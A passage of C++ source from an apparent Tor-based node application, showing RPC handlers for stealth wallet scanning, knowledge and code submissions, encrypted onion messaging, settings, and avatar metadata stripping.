                std::vector<uint8_t> derived(crypto_core_ed25519_BYTES);
                if (crypto_core_ed25519_add(derived.data(), hG.data(), spendPub.data()) != 0)
                    continue;

                if (sodium_memcmp(derived.data(), oneTime.data(), crypto_core_ed25519_BYTES) == 0) {
                    nlohmann::json entry;
                    size_t tp = line.find("\"txid\"");
                    if (tp != std::string::npos) {
                        size_t tq1 = line.find('"', tp + 6);
                        size_t tq2 = (tq1 == std::string::npos) ? std::string::npos : line.find('"', tq1 + 1);
                        if (tq1 != std::string::npos && tq2 != std::string::npos)
                            entry["txid"] = line.substr(tq1 + 1, tq2 - tq1 - 1);
                    }
                    size_t amp = line.find("\"amount\"");
                    if (amp != std::string::npos) {
                        size_t amq1 = line.find('"', amp + 8);
                        size_t amq2 = (amq1 == std::string::npos) ? std::string::npos : line.find('"', amq1 + 1);
                        if (amq1 != std::string::npos && amq2 != std::string::npos)
                            entry["amount"] = line.substr(amq1 + 1, amq2 - amq1 - 1);
                    }
                    entry["one_time_address"] = oneHex;
                    owned.push_back(entry);
                }
            }
            nlohmann::json out;
            out["owned"] = owned;
            return out.dump();
        } catch (const std::exception& e) {
            return std::string("{\"error\":\"") + jsonEscape(e.what()) + "\"}";
        } catch (...) {
            return "{\"error\":\"view scan failed\"}";
        }
    }

    if (method == "transfer.history") {
        std::string filterType = "all";
        size_t fp = paramsJson.find("\"filter\"");
        if (fp != std::string::npos) {
            size_t fq1 = paramsJson.find('"', fp + 8);
            size_t fq2 = paramsJson.find('"', fq1 + 1);
            if (fq1 != std::string::npos && fq2 != std::string::npos)
                filterType = paramsJson.substr(fq1 + 1, fq2 - fq1 - 1);
        }
        nlohmann::json txs = nlohmann::json::array();
        {
            std::ifstream nf(dataDir_ + "/wallet_notes.jsonl");
            std::string line;
            while (nf.good() && std::getline(nf, line)) {
                if (line.empty()) continue;
                nlohmann::json n = nlohmann::json::parse(line, nullptr, false);
                if (n.is_discarded()) continue;
                std::string typ = n.value("type", std::string());
                if (filterType == "sent" && typ != "sent" && typ != "stealth_sent") continue;
                if (filterType == "received" && typ != "received") continue;
                if (filterType == "rewards") continue;
                nlohmann::json row;
                row["type"] = typ.empty() ? "private" : typ;
                if (n.contains("amount")) {
                    if (n["amount"].is_string()) row["amount"] = n["amount"];
                    else {
                        std::ostringstream as;
                        as << std::fixed << std::setprecision(2) << n["amount"].get<double>();
                        row["amount"] = as.str();
                    }
                } else {
                    row["amount"] = "*";
                }
                row["txid"] = n.value("txid", std::string());
                row["status"] = n.value("status", "confirmed");
                int64_t ts = n.value("ts", static_cast<int64_t>(0));
                if (ts > 0) {
                    time_t rawt = (time_t)(ts / 1000);
                    struct tm tmBuf;
                    localtime_r(&rawt, &tmBuf);
                    char tsBuf[32];
                    strftime(tsBuf, sizeof(tsBuf), "%Y-%m-%d %H:%M", &tmBuf);
                    row["timestamp"] = tsBuf;
                } else {
                    row["timestamp"] = "-";
                }
                row["ts"] = ts;
                txs.push_back(row);
            }
        }
        // NAAN drafts are not wallet rewards. Mesh NGT lands via RingCT notes.
        nlohmann::json out;
        out["transactions"] = txs;
        return out.dump();
    }

    if (method == "knowledge.submit") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"error\":\"bad json\"}";
        }
        std::string title = p.value("title", "");
        std::string content = p.value("content", "");
        if (content.empty()) content = p.value("body", "");
        if (title.empty() || content.empty())
            return "{\"error\":\"title and content required\"}";
        std::string citations;
        if (p.contains("citations")) {
            if (p["citations"].is_string()) citations = p["citations"].get<std::string>();
            else citations = p["citations"].dump();
        }
        std::string entryHash = sha256Hex(title + content + std::to_string(nowMillis()));
        std::string sig = ed25519Sign(entryHash);
        {
            nlohmann::json row;
            row["id"] = entryHash.substr(0, 16);
            row["kind"] = "knowledge";
            row["title"] = title;
            row["content"] = content;
            row["citations"] = citations;
            row["status"] = "pending";
            row["ngt_earned"] = "0.00";
            row["hash"] = entryHash.substr(0, 32);
            row["sig"] = sig.substr(0, 16);
            row["ts"] = nowMillis();
            std::ofstream kf(dataDir_ + "/knowledge.jsonl", std::ios::app);
            if (kf.good()) kf << row.dump() << "\n";
        }
        appendLocalChainBlock("knowledge", entryHash.substr(0, 32));
        nlohmann::json out;
        out["ok"] = true;
        out["id"] = entryHash.substr(0, 16);
        out["hash"] = entryHash.substr(0, 32);
        out["status"] = "pending";
        out["creditedAtoms"] = 0;
        out["finalized"] = false;
        out["message"] = "Recorded on the local PoE chain. NGT pays on finalize, not on submit.";
        return out.dump();
    }

    if (method == "knowledge.search") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"results\":[]}";
        }
        std::string query = p.value("query", "");
        if (query.empty()) return "{\"results\":[]}";
        std::string lower_query = query;
        std::transform(lower_query.begin(), lower_query.end(), lower_query.begin(), ::tolower);
        nlohmann::json results = nlohmann::json::array();
        std::ifstream kf(dataDir_ + "/knowledge.jsonl");
        std::string line;
        while (kf.good() && std::getline(kf, line) && results.size() < 20) {
            if (line.empty()) continue;
            nlohmann::json row = nlohmann::json::parse(line, nullptr, false);
            if (row.is_discarded()) continue;
            std::string title = row.value("title", "");
            std::string content = row.value("content", row.value("body", ""));
            std::string hay = title + " " + content;
            std::string lower_hay = hay;
            std::transform(lower_hay.begin(), lower_hay.end(), lower_hay.begin(), ::tolower);
            if (lower_hay.find(lower_query) == std::string::npos) continue;
            std::string snippet = content.empty() ? title : content.substr(0, 160);
            nlohmann::json hit;
            hit["title"] = title.empty() ? "untitled" : title;
            hit["snippet"] = snippet;
            hit["author"] = walletAddress_.substr(0, 12);
            results.push_back(hit);
        }
        nlohmann::json out;
        out["results"] = results;
        return out.dump();
    }

    if (method == "knowledge.my_submissions") {
        std::ostringstream ss;
        ss << "{\"submissions\":[";
        std::ifstream kf(dataDir_ + "/knowledge.jsonl");
        if (kf.good()) {
            std::string line;
            int count = 0;
            while (std::getline(kf, line)) {
                if (line.empty()) continue;
                if (count > 0) ss << ",";
                size_t titlePos = line.find("\"title\":\"");
                std::string entryTitle = "untitled";
                if (titlePos != std::string::npos) {
                    size_t ts = titlePos + 9;
                    size_t te = line.find('"', ts);
                    if (te != std::string::npos) entryTitle = line.substr(ts, te - ts);
                }
                size_t statusPos = line.find("\"status\":\"");
                std::string entryStatus = "pending";
                if (statusPos != std::string::npos) {
                    size_t ss2 = statusPos + 10;
                    size_t se = line.find('"', ss2);
                    if (se != std::string::npos) entryStatus = line.substr(ss2, se - ss2);
                }
                size_t ngtPos = line.find("\"ngt_earned\":\"");
                std::string ngtEarned = "0.00";
                if (ngtPos != std::string::npos) {
                    size_t ns = ngtPos + 14;
                    size_t ne = line.find('"', ns);
                    if (ne != std::string::npos) ngtEarned = line.substr(ns, ne - ns);
                }
                size_t kindPos = line.find("\"kind\":\"");
                std::string kind = "knowledge";
                if (kindPos != std::string::npos) {
                    size_t ks = kindPos + 8;
                    size_t ke = line.find('"', ks);
                    if (ke != std::string::npos) kind = line.substr(ks, ke - ks);
                }
                ss << "{\"title\":\"" << jsonEscape(entryTitle)
                   << "\",\"kind\":\"" << jsonEscape(kind)
                   << "\",\"status\":\"" << entryStatus
                   << "\",\"ngt_earned\":\"" << ngtEarned << "\"}";
                count++;
            }
        }
        ss << "]}";
        return ss.str();
    }

    if (method == "poe.stats") {
        int64_t now = nowMillis();
        int64_t elapsed = (now - startTime_) / 1000;
        int epoch = static_cast<int>(elapsed / 3600);
        int remaining = 3600 - static_cast<int>(elapsed % 3600);
        int rh = remaining / 3600;
        int rm = (remaining % 3600) / 60;
        int knowledgeRows = 0;
        {
            std::ifstream kf(dataDir_ + "/knowledge.jsonl");
            std::string line;
            while (kf.good() && std::getline(kf, line)) {
                if (!line.empty()) knowledgeRows++;
            }
        }
        return "{\"current_epoch\":" + std::to_string(epoch) +
               ",\"total_entries\":" + std::to_string(knowledgeRows + naanSubmissions_) +
               ",\"chain_height\":" + std::to_string(localChainHeight()) +
               ",\"reward_pool\":\"" + balance_ +
               "\",\"next_epoch_in\":\"" + std::to_string(rh) + "h " + std::to_string(rm) + "m\"}";
    }

    if (method == "poe.submit_code") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"error\":\"bad json\"}";
        }
        std::string patch = p.value("patch", "");
        if (patch.empty()) patch = p.value("body", "");
        std::string title = p.value("title", "");
        if (title.empty()) title = p.value("filename", "patch");
        if (patch.empty()) return "{\"error\":\"patch required\"}";

        std::string entryHash = sha256Hex(title + patch + std::to_string(nowMillis()));
        std::string sig = ed25519Sign(entryHash);
        {
            std::ofstream kf(dataDir_ + "/knowledge.jsonl", std::ios::app);
            if (kf.good()) {
                kf << "{\"id\":\"" << entryHash.substr(0, 16)
                   << "\",\"kind\":\"code\""
                   << ",\"title\":\"" << jsonEscape(title)
                   << "\",\"status\":\"pending\""
                   << ",\"ngt_earned\":\"0.00\""
                   << ",\"hash\":\"" << entryHash.substr(0, 32)
                   << "\",\"sig\":\"" << sig.substr(0, 16)
                   << "\",\"ts\":" << nowMillis() << "}\n";
            }
        }
        appendLocalChainBlock("poe_entry", entryHash.substr(0, 32));
        nlohmann::json out;
        out["ok"] = true;
        out["status"] = "pending";
        out["submitId"] = entryHash.substr(0, 16);
        out["message"] = "Code recorded on the local PoE chain. NGT pays on finalize (votes), RingCT coinbase to stealth. Not hash mining. Author stays public.";
        out["creditedAtoms"] = 0;
        out["finalized"] = false;
        return out.dump();
    }

    if (method == "msg.list") {
        std::ostringstream ss;
        ss << "{\"conversations\":[";
        std::ifstream mf(dataDir_ + "/messages.jsonl");
        if (mf.good()) {
            std::unordered_map<std::string, std::pair<std::string, int64_t>> convos;
            std::string line;
            while (std::getline(mf, line)) {
                if (line.empty()) continue;
                size_t peerPos = line.find("\"peer\":\"");
                if (peerPos == std::string::npos) continue;
                size_t ps = peerPos + 8;
                size_t pe = line.find('"', ps);
                if (pe == std::string::npos) continue;
                std::string peer = line.substr(ps, pe - ps);
                size_t bodyPos = line.find("\"body\":\"");
                std::string body;
                if (bodyPos != std::string::npos) {
                    size_t bs2 = bodyPos + 8;
                    size_t be = line.find('"', bs2);
                    if (be != std::string::npos) body = line.substr(bs2, be - bs2);
                }
                size_t tsPos = line.find("\"ts\":");
                int64_t ts = 0;
                if (tsPos != std::string::npos) ts = std::atoll(line.c_str() + tsPos + 5);
                if (convos.find(peer) == convos.end() || ts > convos[peer].second)
                    convos[peer] = {body, ts};
            }
            int i = 0;
            for (auto& kv : convos) {
                if (i > 0) ss << ",";
                ss << "{\"peer\":\"" << jsonEscape(kv.first)
                   << "\",\"last_msg\":\"" << jsonEscape(kv.second.first)
                   << "\",\"ts\":" << kv.second.second << "}";
                i++;
            }
        }
        ss << "]}";
        return ss.str();
    }

    if (method == "msg.get") {
        size_t pp = paramsJson.find("\"peer\"");
        if (pp == std::string::npos) return "{\"messages\":[]}";
        size_t pq1 = paramsJson.find('"', pp + 6);
        size_t pq2 = paramsJson.find('"', pq1 + 1);
        if (pq2 == std::string::npos) return "{\"messages\":[]}";
        std::string peer = paramsJson.substr(pq1 + 1, pq2 - pq1 - 1);
        std::ostringstream ss;
        ss << "{\"messages\":[";
        std::ifstream mf(dataDir_ + "/messages.jsonl");
        if (mf.good()) {
            std::string line;
            int count = 0;
            while (std::getline(mf, line)) {
                if (line.empty()) continue;
                if (line.find("\"peer\":\"" + peer + "\"") != std::string::npos) {
                    if (count > 0) ss << ",";
                    size_t fromPos = line.find("\"from\":\"");
                    std::string from = walletAddress_;
                    if (fromPos != std::string::npos) {
                        size_t fs = fromPos + 8;
                        size_t fe = line.find('"', fs);
                        if (fe != std::string::npos) from = line.substr(fs, fe - fs);
                    }
                    size_t bodyPos = line.find("\"body\":\"");
                    std::string body;
                    if (bodyPos != std::string::npos) {
                        size_t bs2 = bodyPos + 8;
                        size_t be = line.find('"', bs2);
                        if (be != std::string::npos) body = line.substr(bs2, be - bs2);
                    }
                    size_t tsPos = line.find("\"ts\":");
                    int64_t ts = 0;
                    if (tsPos != std::string::npos) ts = std::atoll(line.c_str() + tsPos + 5);
                    ss << "{\"from\":\"" << jsonEscape(from)
                       << "\",\"to\":\"" << jsonEscape(peer)
                       << "\",\"body\":\"" << jsonEscape(body)
                       << "\",\"ts\":" << ts
                       << ",\"encrypted\":" << (line.find("\"encrypted\":true") != std::string::npos ? "true" : "false")
                       << ",\"quantum_signed\":" << (line.find("\"quantum_signed\":true") != std::string::npos ? "true" : "false") << "}";
                    count++;
                }
            }
        }
        ss << "]}";
        return ss.str();
    }

    if (method == "msg.send") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"error\":\"bad json\"}";
        }
        std::string peer = onionHostOnly(trimSeedToken(p.value("peer", "")));
        std::string body = p.value("body", "");
        if (peer.empty() || body.empty())
            return "{\"error\":\"peer and body required\"}";
        std::string from = ownOnion_.empty() ? walletAddress_ : ownOnion_;
        std::string peerPk = peerBoxPk(peer);
        std::string peerKem = peerKemPk(peer);
        if (peerPk.empty() && isValidV3Onion(peer) && !ownOnion_.empty()) {
            dialPeer(peer);
            peerPk = peerBoxPk(peer);
            if (peerKem.empty()) peerKem = peerKemPk(peer);
        }
        if (!isHex64(peerPk))
            return "{\"error\":\"peer has no sealed-box key yet\"}";
        nlohmann::json inner;
        inner["from"] = from;
        inner["ts"] = nowMillis();
        inner["body"] = body;
        std::string sealed;
        if (!sealToPeer(peerPk, inner.dump(), sealed))
            return "{\"error\":\"seal failed\"}";
        const bool kyberReal = synapse::quantum::getPQCBackendStatus().kyberReal;
        bool hybrid = false;
        std::string kemCtB64;
        std::string wireSeal = sealed;
        if (kyberReal && !peerKem.empty()) {
            if (!wrapSealHybrid(peerKem, sealed, kemCtB64, wireSeal))
                return "{\"error\":\"hybrid kem wrap failed\"}";
            hybrid = true;
        }
        {
            std::ofstream mf(dataDir_ + "/messages.jsonl", std::ios::app);
            if (mf.good()) {
                mf << "{\"peer\":\"" << jsonEscape(peer)
                   << "\",\"from\":\"" << jsonEscape(from)
                   << "\",\"to\":\"" << jsonEscape(peer)
                   << "\",\"dir\":\"out\""
                   << ",\"body\":\"" << jsonEscape(body)
                   << "\",\"ts\":" << nowMillis()
                   << ",\"encrypted\":true,\"hybrid\":"
                   << (hybrid ? "true" : "false")
                   << ",\"quantum_signed\":false}\n";
            }
        }
        bool delivered = false;
        if (isValidV3Onion(peer) && !ownOnion_.empty()) {
            nlohmann::json wire;
            wire["v"] = hybrid ? 3 : 2;
            wire["id"] = sha256Hex(peer + wireSeal + std::to_string(nowMillis())).substr(0, 16);
            wire["from"] = ownOnion_;
            wire["to"] = peer;
            wire["ts"] = nowMillis();
            if (hybrid) wire["kem"] = kemCtB64;
            wire["seal"] = wireSeal;
            std::string payload = "NODE_MSG " + wire.dump() + "\n";
            std::string reply;
            delivered = sendOnionPayload(peer, 8333, payload, &reply);
        }
        nlohmann::json out;
        out["ok"] = true;
        out["delivered"] = delivered;
        out["local"] = true;
        out["sealed"] = true;
        out["hybrid"] = hybrid;
        out["v"] = hybrid ? 3 : 2;
        if (!delivered)
            out["note"] = "saved locally; live Tor delivery failed or peer is not a v3 onion";
        return out.dump();
    }

    if (method == "rental.list") {
        std::ostringstream ss;
        ss << "{\"listings\":[],\"my_rentals\":[],\"sharing\":false,\"share_price\":\"1.0\"}";
        std::ifstream rf(dataDir_ + "/rental_state.json");
        if (rf.good()) {
            std::string content((std::istreambuf_iterator<char>(rf)),
                                 std::istreambuf_iterator<char>());
            if (!content.empty()) return content;
        }
        return ss.str();
    }

    if (method == "rental.rent") {
        size_t np = paramsJson.find("\"node_id\"");
        if (np == std::string::npos) return "{\"error\":\"node_id required\"}";
        return "{\"ok\":true,\"rental_id\":\"r-" + std::to_string(nowMillis()) + "\"}";
    }

    if (method == "rental.stop") {
        return "{\"ok\":true}";
    }

    if (method == "rental.share") {
        size_t ep = paramsJson.find("\"enabled\"");
        bool enabled = false;
        if (ep != std::string::npos) {
            enabled = paramsJson.find("true", ep) < paramsJson.find("false", ep);
        }
        size_t pp = paramsJson.find("\"price_ngt_hr\"");
        std::string price = "1.0";
        if (pp != std::string::npos) {
            size_t pq1 = paramsJson.find('"', pp + 14);
            size_t pq2 = paramsJson.find('"', pq1 + 1);
            if (pq1 != std::string::npos && pq2 != std::string::npos)
                price = paramsJson.substr(pq1 + 1, pq2 - pq1 - 1);
        }
        std::ofstream rf(dataDir_ + "/rental_state.json", std::ios::trunc);
        if (rf.good()) {
            rf << "{\"listings\":[],\"my_rentals\":[],\"sharing\":"
               << (enabled ? "true" : "false")
               << ",\"share_price\":\"" << jsonEscape(price) << "\"}";
        }
        return "{\"ok\":true,\"sharing\":" + std::string(enabled ? "true" : "false") + "}";
    }

    if (method == "settings.get") {
        std::ostringstream ss;
        ss << "{\"connection_type\":\"tor\""
           << ",\"bridge_lines\":\"\""
           << ",\"model_name\":\"" << jsonEscape(modelName_) << "\""
           << ",\"model_loaded\":" << (modelLoaded_ ? "true" : "false")
           << ",\"model_path\":\"" << jsonEscape(modelPath_) << "\""
           << ",\"cpu_threads\":4,\"ram_limit_mb\":4096,\"disk_limit_mb\":50000"
           << ",\"gpu_enabled\":false,\"gpu_device\":\"\",\"gpu_layers\":32"
           << ",\"naan_enabled\":false"
           << ",\"naan_running\":" << (naanRunning_.load() ? "true" : "false")
           << ",\"naan_topics\":\"";
        for (size_t i = 0; i < cfgTopics_.size(); i++) {
            if (i) ss << ", ";
            ss << cfgTopics_[i];
        }
        ss << "\",\"naan_site_allowlist\":\"\""
           << ",\"launch_at_login\":false,\"minimize_to_tray\":false,\"auto_update\":true"
           << ",\"profile_alias\":\"\",\"profile_avatar\":\"\"}";
        std::string live = ss.str();
        std::ifstream sf(dataDir_ + "/settings.json");
        if (sf.good()) {
            std::string content((std::istreambuf_iterator<char>(sf)),
                                 std::istreambuf_iterator<char>());
            nlohmann::json file = nlohmann::json::parse(content, nullptr, false);
            nlohmann::json base = nlohmann::json::parse(live, nullptr, false);
            if (!file.is_discarded() && file.is_object() && !base.is_discarded() && base.is_object()) {
                for (auto it = file.begin(); it != file.end(); ++it) {
                    if (it.key() == "model_loaded" || it.key() == "model_name" ||
                        it.key() == "model_path" || it.key() == "naan_running")
                        continue;
                    base[it.key()] = it.value();
                }
                base["model_loaded"] = modelLoaded_;
                base["model_name"] = modelName_;
                base["model_path"] = modelPath_;
                base["naan_running"] = naanRunning_.load();
                if (!base.contains("connection_type") ||
                    (base["connection_type"] != "tor" &&
                     base["connection_type"] != "tor_bridges")) {
                    base["connection_type"] = "tor";
                }
                return base.dump();
            }
            if (!content.empty()) return content;
        }
        return live;
    }

    if (method == "settings.update") {
        std::string existing;
        {
            std::ifstream sf(dataDir_ + "/settings.json");
            if (sf.good()) {
                existing.assign((std::istreambuf_iterator<char>(sf)),
                                 std::istreambuf_iterator<char>());
            }
        }
        if (existing.empty()) {
            existing = "{\"connection_type\":\"tor\",\"model_loaded\":false}";
        }
        nlohmann::json base = nlohmann::json::parse(existing, nullptr, false);
        nlohmann::json patch = nlohmann::json::parse(paramsJson, nullptr, false);
        if (base.is_discarded()) base = nlohmann::json::object();
        if (patch.is_discarded() || !patch.is_object()) {
            return "{\"error\":\"invalid settings json\"}";
        }
        if (!base.is_object()) base = nlohmann::json::object();
        for (auto it = patch.begin(); it != patch.end(); ++it) {
            base[it.key()] = it.value();
        }
        if (!base.contains("connection_type") ||
            (base["connection_type"] != "tor" &&
             base["connection_type"] != "tor_bridges")) {
            base["connection_type"] = "tor";
        }
        std::ofstream sf(dataDir_ + "/settings.json", std::ios::trunc);
        if (sf.good()) sf << base.dump();
        // Harvest sources are independent of connection type. Always Tor SOCKS.
        cfgSources_ = "tor";
        persistNaanSources();
        if (base.contains("naan_topics") && base["naan_topics"].is_string()) {
            auto topics = parseTopicCsv(base["naan_topics"].get<std::string>());
            if (!topics.empty()) cfgTopics_ = topics;
        }
        if (base.contains("profile_alias") && base["profile_alias"].is_string())
            profileAlias_ = base["profile_alias"].get<std::string>();
        if (patch.contains("naan_enabled")) {
            bool wantNaan = false;
            if (base.contains("naan_enabled")) {
                if (base["naan_enabled"].is_boolean()) wantNaan = base["naan_enabled"].get<bool>();
                else if (base["naan_enabled"].is_number()) wantNaan = base["naan_enabled"].get<int>() != 0;
            }
            if (wantNaan) startNaan();
            else stopNaan();
        }
        return "{\"ok\":true}";
    }

    if (method == "naan.config") {
        size_t tp = paramsJson.find("\"topics\"");
        if (tp != std::string::npos) {
            size_t tq1 = paramsJson.find('"', tp + 8);
            size_t tq2 = paramsJson.find('"', tq1 + 1);
            if (tq1 != std::string::npos && tq2 != std::string::npos) {
                std::string topics = paramsJson.substr(tq1 + 1, tq2 - tq1 - 1);
                cfgTopics_.clear();
                std::istringstream iss(topics);
                std::string token;
                while (std::getline(iss, token, ',')) {
                    size_t start = token.find_first_not_of(" \t");
                    size_t end = token.find_last_not_of(" \t");
                    if (start != std::string::npos)
                        cfgTopics_.push_back(token.substr(start, end - start + 1));
                }
            }
        }
        size_t tip = paramsJson.find("\"tick_interval\"");
        if (tip != std::string::npos) {
            size_t colon = paramsJson.find(':', tip);
            if (colon != std::string::npos) {
                int v = std::atoi(paramsJson.c_str() + colon + 1);
                if (v >= 10 && v <= 600) naanTickInterval_ = v;
            }
        }
        size_t bp = paramsJson.find("\"budget_limit\"");
        if (bp != std::string::npos) {
            size_t bq1 = paramsJson.find('"', bp + 14);
            size_t bq2 = paramsJson.find('"', bq1 + 1);
            if (bq1 != std::string::npos && bq2 != std::string::npos) {
                double v = std::atof(paramsJson.substr(bq1 + 1, bq2 - bq1 - 1).c_str());
                if (v > 0) naanBudgetPerEpoch_ = v;
            }
        }
        cfgSources_ = "tor";
        persistNaanSources();
        return "{\"ok\":true}";
    }

    if (method == "profile.set_avatar") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"error\":\"bad json\"}";
        }
        std::string srcPath = p.value("path", "");
        if (srcPath.empty()) return "{\"error\":\"missing path\"}";
        std::ifstream src(srcPath, std::ios::binary);
        if (!src.good()) return "{\"error\":\"file not found\"}";
        src.close();

        std::string pyPath = dataDir_ + "/strip_avatar.py";
        {
            std::ofstream py(pyPath, std::ios::trunc);
            py << kStripAvatarPy;
        }
        std::string destPng = dataDir_ + "/avatar.png";
        std::string destJpg = dataDir_ + "/avatar_mesh.jpg";
        std::string cmd = "python3 " + shQuote(pyPath) + " " + shQuote(srcPath) + " " +
                          shQuote(destPng) + " " + shQuote(destJpg) + " 2>/dev/null";
        int rc = std::system(cmd.c_str());
        if (rc != 0) return "{\"error\":\"could not strip image metadata\"}";
        restrictSecretFile(destPng);
        restrictSecretFile(destJpg);

        std::string pngUrl = fileToDataUrl(destPng, "image/png");
        std::string jpgUrl = fileToDataUrl(destJpg, "image/jpeg");
        if (pngUrl.empty()) return "{\"error\":\"stripped image unreadable\"}";
        profileAvatarDataUrl_ = pngUrl;
        profileAvatarMesh_ = jpgUrl;

        nlohmann::json settings = nlohmann::json::object();
        {
            std::ifstream sf(dataDir_ + "/settings.json");
            if (sf.good()) {
                std::string content((std::istreambuf_iterator<char>(sf)),
                                     std::istreambuf_iterator<char>());
                auto parsed = nlohmann::json::parse(content, nullptr, false);
                if (!parsed.is_discarded() && parsed.is_object()) settings = parsed;
            }
        }
        settings["profile_avatar"] = pngUrl;
        settings["profile_avatar_mesh"] = jpgUrl;
        std::ofstream out(dataDir_ + "/settings.json", std::ios::trunc);
        if (out.good()) out << settings.dump();

        nlohmann::json resp;
        resp["ok"] = true;
        resp["avatar_data"] = pngUrl;
        resp["stripped"] = true;
        return resp.dump();
    }

    if (method == "update.check") {
        return "{\"update_available\":false,\"version\":\"v0.1.0-V9\",\"current\":\"v0.1.0-V9\",\"channel\":\"none\",\"note\":\"no auto-update feed wired\"}";
    }

    (void)paramsJson;
    return "{\"error\":\"unknown method\",\"method\":\"" + method + "\"}";
  } catch (const std::exception& e) {
    return std::string("{\"error\":\"internal: ") + e.what() + "\"}";
  } catch (...) {
    return "{\"error\":\"internal error\"}";
  }
}

int SynapsedEngine::subscribe(const std::string& eventType, EventCallback callback) {
    std::lock_guard<std::mutex> lock(mtx_);
    subscribers_[eventType].push_back(std::move(callback));
    return 0;
}

uint64_t SynapsedEngine::localChainHeight() const {
    uint64_t h = lastBlockHeight_.load();
    auto bump = [&](const std::string& path) {
        std::ifstream f(path);
        if (!f.good()) return;
        std::string line;
        while (std::getline(f, line)) {
            if (line.empty()) continue;
            size_t hp = line.find("\"height\":");
            if (hp == std::string::npos) continue;
            uint64_t x = static_cast<uint64_t>(std::atoll(line.c_str() + hp + 9));
            if (x > h) h = x;
        }
    };
    bump(dataDir_ + "/blocks.jsonl");
    return h;
}

void SynapsedEngine::appendLocalChainBlock(const std::string& eventType, const std::string& eventHash) {
    uint64_t height = localChainHeight() + 1;
    int64_t ts = nowMillis();
    std::string prev = std::string(64, '0');
    auto lastHash = [&](const std::string& path) {
        std::ifstream f(path);
        if (!f.good()) return;
        std::string line, last;
        while (std::getline(f, line)) {
            if (!line.empty()) last = line;
        }
        if (last.empty()) return;
        size_t hp = last.find("\"hash\":\"");
        if (hp == std::string::npos) return;
        size_t hs = hp + 8;
        size_t he = last.find('"', hs);
        if (he != std::string::npos) prev = last.substr(hs, he - hs);
    };
    lastHash(dataDir_ + "/blocks.jsonl");

    std::string blockHash = sha256Hex(eventHash + std::to_string(height) + std::to_string(ts));
    std::ofstream blkf(dataDir_ + "/blocks.jsonl", std::ios::app);
    if (blkf.good()) {
        blkf << "{\"height\":" << height
             << ",\"hash\":\"" << blockHash
             << "\",\"prev_hash\":\"" << jsonEscape(prev)
             << "\",\"timestamp\":" << ts
             << ",\"producer\":\"" << jsonEscape(walletAddress_)
             << "\",\"events\":1"
             << ",\"difficulty\":1"
             << ",\"nonce\":0"
             << ",\"size\":" << eventHash.size()
             << ",\"events_detail\":[{\"type\":\"" << jsonEscape(eventType)
             << "\",\"author\":\"" << jsonEscape(walletAddress_)
             << "\",\"hash\":\"" << jsonEscape(eventHash)
             << "\",\"ts\":" << ts << "}]"
             << "}\n";
    }
    lastBlockHeight_ = height;
}

std::string SynapsedEngine::getStatus() const {
    if (!initialized_) return "{\"error\":\"not initialized\"}";

    auto ti = queryTorControl();
    auto pqc = synapse::quantum::getPQCBackendStatus();

    if (ti.connected || !ownOnion_.empty() || sessionSocksPort_ > 0) {
        connectionType_ = "tor";
        if (!ti.bootstrap.empty()) torBootstrap_ = ti.bootstrap;
        if (ti.circuits > 0) torCircuits_ = ti.circuits;
        int n = 0;
        if (!ownOnion_.empty()) n = 1;
        {
            std::lock_guard<std::mutex> lock(knownPeersMtx_);
            std::set<std::string> seen;
            if (!ownOnion_.empty()) seen.insert(onionHostOnly(ownOnion_));
            for (const auto& kv : knownPeers_) {
                const auto& kp = kv.second;
                const std::string h = onionHostOnly(kp.onion);
                if (h.empty() || seen.count(h)) continue;
                if (kp.alias.empty() && kp.avatar.empty()) continue;
                seen.insert(h);
                n++;
            }
        }
        peerCount_ = n;
    }

    int64_t uptime = nowMillis() - startTime_;
    nlohmann::json j;
    j["node_id"] = nodeId_;
    j["connection"] = connectionType_;
    j["peers"] = peerCount_;
    j["balance"] = balance_;
    j["naan_state"] = naanState_;
    j["last_block"] = localChainHeight();
    j["model_loaded"] = modelLoaded_;
    j["model_name"] = modelName_;
    j["model_path"] = modelPath_;
    j["inference"] = inferenceReady_;
    j["tor_bootstrap"] = torBootstrap_;
    j["tor_circuits"] = torCircuits_;
    j["onion"] = ownOnion_;
    j["bandwidth_in"] = inboundKbps_;
    j["bandwidth_out"] = outboundKbps_;
    j["uptime"] = uptime;
    j["version"] = "v0.1.0-V9";
    j["pqc_backend"] = (pqc.kyberReal && pqc.dilithiumReal && pqc.sphincsReal) ? "liboqs" : "simulation";
    j["kyber_real"] = pqc.kyberReal;
    j["dilithium_real"] = pqc.dilithiumReal;
    j["sphincs_real"] = pqc.sphincsReal;
    j["kem"] = "ML-KEM-768 / Kyber768";
    j["sig"] = "ML-DSA-65 / Dilithium3";
    j["hash_sig"] = "SLH-DSA-SHA2-128s / SPHINCS+";
    j["msg"] = pqc.kyberReal
                   ? "hybrid Kyber+X25519 NODE_MSG over Tor"
                   : "X25519 crypto_box_seal over Tor (not PQC)";
    return j.dump();
}

void SynapsedEngine::generateTorrc() const {
    // Session Tor writes its own torrc under ~/.synapsenet/session-tor/.
}

SynapsedEngine::TorInfo SynapsedEngine::queryTorControl() const {
    {
        std::lock_guard<std::mutex> lock(torInfoMtx_);
        if (torInfoCacheMs_ > 0 && nowMillis() - torInfoCacheMs_ < 3000) {
            return torInfoCache_;
        }
    }

    TorInfo info;
    std::vector<uint16_t> ports;
    if (sessionControlPort_ > 0) ports.push_back(sessionControlPort_);
    else if (gControlPort.load() > 0) ports.push_back(static_cast<uint16_t>(gControlPort.load()));

    int fd = -1;
    std::string cookie = sessionCookiePath_.empty() ? gCookiePath : sessionCookiePath_;
    for (uint16_t p : ports) {
        fd = connectLocalPort(p, 0);
        if (fd < 0) continue;
        if (controlAuthenticate(fd, cookie) || (CLOSESOCK(fd), fd = connectLocalPort(p, 0), fd >= 0 && controlAuthenticate(fd, ""))) {
            break;
        }
        if (fd >= 0) CLOSESOCK(fd);
        fd = -1;
    }
    if (fd < 0) {
        if (!ownOnion_.empty() || sessionSocksPort_ > 0) {
            info.connected = true;
            info.bootstrap = torBootstrap_.empty() ? "0%" : torBootstrap_;
        }
        {
